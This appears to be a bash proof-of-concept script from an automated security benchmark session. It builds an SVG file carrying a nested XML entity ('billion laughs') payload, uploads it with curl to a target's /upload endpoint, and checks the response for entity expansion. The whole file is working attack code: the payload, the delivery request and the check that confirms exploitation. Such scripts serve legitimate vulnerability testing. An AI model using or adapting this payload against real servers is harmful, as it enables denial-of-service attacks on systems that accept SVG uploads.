#!/bin/bash
# POC: XXE Billion Laughs DoS attack via SVG file upload with recursive entity expansion
# Target: ./repo
# Created: 2025-11-07T21:55:49.387Z
# Session: benchmark-XBEN-077-24-mhpdz86a

# XXE Billion Laughs DoS Attack POC
# This script creates a malicious SVG with nested XML entity definitions
# that expand exponentially when processed by the XML parser

TARGET_URL="${1:-http://localhost:3000}"
ENDPOINT="/upload"  # Adjust based on actual endpoint

# Create temporary directory for POC
POC_DIR="/tmp/xxe_poc_$$"
mkdir -p "$POC_DIR"

# Create the billion laughs SVG payload
# This creates nested entity definitions that expand exponentially
create_billion_laughs_svg() {
    local output_file="$1"
    
    cat > "$output_file" << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="400">
  <text x="10" y="20" font-size="14">&lol5;</text>
</svg>
EOF
}

# Create the malicious SVG
MALICIOUS_SVG="$POC_DIR/xxe_billionlaughs.svg"
create_billion_laughs_svg "$MALICIOUS_SVG"

echo "[*] XXE Billion Laughs DoS Attack POC"
echo "[*] Target: $TARGET_URL$ENDPOINT"
echo "[*] Malicious SVG payload created: $MALICIOUS_SVG"
echo ""

# Display payload information
echo "[*] Payload structure:"
echo "    Level 1 (lol):  1 repetition = 1x"
echo "    Level 2 (lol2): 10x lol = 10x"
echo "    Level 3 (lol3): 10x lol2 = 100x"
echo "    Level 4 (lol4): 10x lol3 = 1,000x"
echo "    Level 5 (lol5): 10x lol4 = 10,000x"
echo "    Total expansion: 10^5 = 100,000x multiplication"
echo ""

# Attempt the attack
echo "[*] Sending malicious SVG to server..."
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -F "name=Test" \
  -F "surname=User" \
  -F "address=123 Main St" \
  -F "image=@$MALICIOUS_SVG" \
  "$TARGET_URL$ENDPOINT" 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Response Code: $HTTP_CODE"
echo ""

# Check for successful exploitation
if echo "$BODY" | grep -q "lol"; then
    echo "[+] VULNERABLE: Server expanded XML entities in response"
    echo "[+] Entity expansion detected in response body"
    
    # Count occurrences of "lol" to verify expansion
    LOL_COUNT=$(echo "$BODY" | grep -o "lol" | wc -l)
    echo "[+] 'lol' string appears $LOL_COUNT times in response"
    echo ""
    
    if [ "$LOL_COUNT" -gt 1000 ]; then
        echo "[+] CONFIRMED: Significant entity expansion occurred (>1000 repetitions)"
        echo "[+] This indicates the server is vulnerable to billion laughs attacks"
        echo ""
        echo "[*] Vulnerability confirmed: The XML parser expanded recursive entities"
        echo "[*] An attacker could consume server resources and cause DoS"
    fi
else
    echo "[!] Entity expansion may have been blocked or sanitized"
    echo "[!] The server might have XXE protections enabled"
fi

# Show a sample of the response
echo ""
echo "[*] Response sample (first 500 chars):"
echo "$BODY" | head -c 500
echo ""
echo ""

# Cleanup
rm -rf "$POC_DIR"

echo "[*] POC complete"